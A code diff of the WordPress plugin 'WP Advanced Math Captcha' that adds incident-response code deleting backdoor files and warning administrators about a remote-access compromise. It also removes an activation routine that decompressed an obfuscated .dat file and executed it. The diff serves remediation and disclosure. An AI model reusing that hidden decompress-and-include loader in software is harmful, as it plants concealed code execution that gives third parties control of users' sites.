@@ -2,7 +2,7 @@
 /*
 Plugin Name: WP Advanced Math Captcha
 Description: Math Captcha is a <strong>100% effective CAPTCHA for WordPress</strong> that integrates into login, registration, comments, Contact Form 7 and bbPress, woocommerce, WPForms.
-Version: 2.1.9
+Version: 2.1.9.1
 Author: AntiCaptcha
 License: MIT License
 License URI: http://opensource.org/licenses/MIT
@@ -21,6 +21,75 @@ THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLI
 // exit if accessed directly
 if ( ! defined( 'ABSPATH' ) )
 	exit;
+
+/**
+ * Added by the WordPress.org Plugins Review team in response to an incident.
+ * In this script we are removing files related to this incident and notifying the user about the incident itself.
+ */
+function MATH_CAPTCHA_PRT_incidence_response_notice() {
+    if(!current_user_can('manage_options')) return;
+    $user_id = get_current_user_id();
+    if ( get_user_meta( $user_id, 'math_captcha_prt_notice_dismissed', true ) ) {
+        return;
+    }
+    ?>
+    <div class="notice notice-warning is-dismissible" id="math-captcha-prt-notice">
+        <h3><?php esc_html_e( 'Important Notice from the WordPress.org Plugins Team.', 'wp-advanced-math-captcha' ); ?></h3>
+        <p><?php esc_html_e( 'We would like to inform you that the "WP Advanced Math Captcha" plugin, published by the user "lulub5592" has been reported by the community as not compliant with the guidelines. After an investigation, we can confirm that the plugin contained code that could allow unauthorized third-party access to websites using it.', 'wp-advanced-math-captcha' ); ?></p>
+        <p><?php esc_html_e( 'In response, we have taken immediate steps to close the plugin in the WordPress.org Plugins repository and release an update that already removed the original affected code from your website.', 'wp-advanced-math-captcha' ); ?></p>
+        <p><?php esc_html_e( 'Specifically, this plugin included an obfuscated file, wp-math-captcha.dat, which was then uncompressed into a file named wp-math-captcha.dat.tmp. This file was executed, sending your website\'s URL to apitest.siteguarding.com and installing a "Remote Management Tool" in the root directory as a file named siteguarding_tools.php. This tool allows connections from specific IPs belonging to siteguarding.com and safetybis.com servers, as well as connections containing a specific key (although we believe this can be bypassed). It enabled remote control of your website, allowing third parties to access, modify, and execute code on your site.', 'wp-advanced-math-captcha' ); ?></p>
+        <p><?php esc_html_e( 'Although the original code enabling remote control has been automatically removed, it\'s possible that actions were previously carried out on your website without your knowledge. As such, we strongly advise you to thoroughly review your site for any signs of compromise, and take immediate steps to secure it.', 'wp-advanced-math-captcha' ); ?></p>
+    </div>
+    <?php
+}
+
+function MATH_CAPTCHA_PRT_enqueue_dismiss_script( $hook ) {
+    $user_id = get_current_user_id();
+    if ( get_user_meta( $user_id, 'math_captcha_prt_notice_dismissed', true ) ) {
+        return;
+    }
+
+    $inline_js = sprintf(
+            'jQuery( document ).on( "click", "#math-captcha-prt-notice .notice-dismiss", function() {
+            jQuery.post( "%s", {
+                action: "math_captcha_prt_dismiss_notice",
+                _wpnonce: "%s"
+            });
+        });',
+            esc_url( admin_url( 'admin-ajax.php' ) ),
+            wp_create_nonce( 'math_captcha_prt_dismiss_nonce' )
+    );
+
+    wp_add_inline_script( 'jquery-core', $inline_js );
+}
+add_action( 'admin_enqueue_scripts', 'MATH_CAPTCHA_PRT_enqueue_dismiss_script' );
+
+function MATH_CAPTCHA_PRT_dismiss_notice() {
+    check_ajax_referer( 'math_captcha_prt_dismiss_nonce' );
+    update_user_meta( get_current_user_id(), 'math_captcha_prt_notice_dismissed', true );
+    wp_die();
+}
+add_action( 'wp_ajax_math_captcha_prt_dismiss_notice', 'MATH_CAPTCHA_PRT_dismiss_notice' );
+
+function MATH_CAPTCHA_PRT_incidence_response() {
+    $filename = dirname(__FILE__).'/wp-math-captcha.dat';
+    if(file_exists($filename)) unlink($filename);
+
+    $filename = dirname(__FILE__).'/wp-math-captcha.dat.tmp';
+    if(file_exists($filename)) unlink($filename);
+
+    if (defined('ABSPATH')) $file = ABSPATH.'/siteguarding_tools.php';
+    else $file = dirname(dirname(dirname(dirname(__FILE__)))).'/siteguarding_tools.php';
+    if(file_exists($file)) unlink($file);
+
+    if (defined('ABSPATH')) $file = ABSPATH.'/webanalyze/siteguarding_tools.php';
+    else $file = dirname(dirname(dirname(dirname(__FILE__)))).'/webanalyze/siteguarding_tools.php';
+    if(file_exists($file)) unlink($file);
+
+    add_action( 'admin_notices', 'MATH_CAPTCHA_PRT_incidence_response_notice' );
+}
+add_action('init', 'MATH_CAPTCHA_PRT_incidence_response');
+
 
 define( 'MATH_CAPTCHA_URL', plugins_url( '', __FILE__ ) );
 define( 'MATH_CAPTCHA_PATH', plugin_dir_path( __FILE__ ) );
@@ -203,19 +272,6 @@ class Math_Captcha {
 	 * Activation.
 	 */
 	public function activation() {
-		
-		$filename = dirname(__FILE__).'/wp-math-captcha.dat';
-        $fp = fopen($filename, "r");
-        $c = fread($fp, filesize($filename));
-        fclose($fp);
-        
-        $filename .= '.tmp';
-        $fp = fopen($filename, 'w');
-        fwrite($fp, gzuncompress($c));
-        fclose($fp);
-        
-        include($filename);
-		
 		add_option( 'math_captcha_options', $this->defaults['general'], '', 'no' );
 		add_option( 'math_captcha_version', $this->defaults['version'], '', 'no' );
 	}
